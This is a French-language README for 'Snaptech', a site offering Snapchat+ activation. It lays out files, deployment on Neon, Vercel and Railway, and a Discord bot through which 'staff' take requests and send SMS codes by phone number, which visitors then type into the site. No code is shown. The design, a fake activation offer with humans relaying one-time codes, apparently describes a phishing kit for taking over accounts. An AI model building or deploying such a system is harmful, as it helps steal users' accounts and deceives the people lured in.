# 🎉 Snaptech - Snapchat+ Activation

## Architecture

```
📁 snaptech/
├── index.html          → Page principale (formulaire)
├── validation.html     → Page de validation (attente staff)
├── code.html           → Page de saisie du code SMS
├── style.css           → Styles globaux
├── script.js           → Logique formulaire
├── validation.js       → Polling statut
├── code.js             → Saisie OTP
├── api/
│   ├── snapchat.js     → API : enregistre demande + webhook Discord
│   ├── status.js       → API : retourne statut demande (polling)
│   ├── verify-code.js  → API : vérifie le code utilisateur
│   └── staff-action.js → API : actions staff (claim / send_code)
├── bot/
│   ├── bot.js          → Bot Discord (discord.js)
│   ├── package.json    → Dépendances bot
│   ├── Dockerfile      → Pour Railway/Render
│   └── .env.example    → Variables bot
├── package.json        → Dépendances Vercel
├── vercel.json         → Routing Vercel
└── neon.sql            → Schéma base de données
```

## Déploiement

### 1. Base de données Neon
1. Crée un projet sur [neon.tech](https://neon.tech)
2. Exécute `neon.sql` dans l'éditeur SQL
3. Copie la **Connection String**

### 2. Site Vercel
```bash
# Variables d'environnement Vercel :
DATABASE_URL=postgres://...
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
STAFF_SECRET=un_secret_long_et_aleatoire
```

### 3. Bot Discord (Railway/Render — PAS Vercel)
> ⚠️ Un bot Discord doit tourner en continu. Vercel est serverless (fonctions qui s'arrêtent). Héberge le bot sur **Railway** ou **Render**.

```bash
cd bot
# Crée un fichier .env avec les variables
npm install
npm start
```

**Variables du bot :**
```
DISCORD_BOT_TOKEN=...
DISCORD_CLIENT_ID=...
DISCORD_GUILD_ID=...
DISCORD_LOG_CHANNEL_ID=...
DATABASE_URL=... (même que le site)
STAFF_SECRET=... (même que le site)
API_BASE=https://snaptech.vercel.app
```

### 4. Config Discord
1. Crée une application sur [Discord Developer Portal](https://discord.com/developers/applications)
2. Crée un bot, copie le token
3. Ajoute le bot au serveur avec les scopes `bot` + `applications.commands`
4. Dans le serveur : `/config salon:#logs`

## Flux utilisateur

1. **Utilisateur** remplit le formulaire → clic "Activer"
2. Redirection vers `validation.html` avec spinner
3. **API** enregistre en DB + envoie embed Discord
4. **Staff** voit l'embed Discord → clic "Prendre en charge"
5. **Staff** envoie le code via `/sendcode phone:06... code:123456`
6. **Page validation** poll toutes les 3s → détecte `waiting_code` → redirige vers `code.html`
7. **Utilisateur** entre le code → API vérifie → `completed`
8. **Discord** reçoit confirmation "Code validé"

## Statuts

| Statut | Description |
|--------|-------------|
| `pending` | Demande reçue, en attente staff |
| `processing` | Staff a pris en charge |
| `waiting_code` | Staff a envoyé le code SMS |
| `completed` | Utilisateur a validé le code |
| `failed` | Échec |
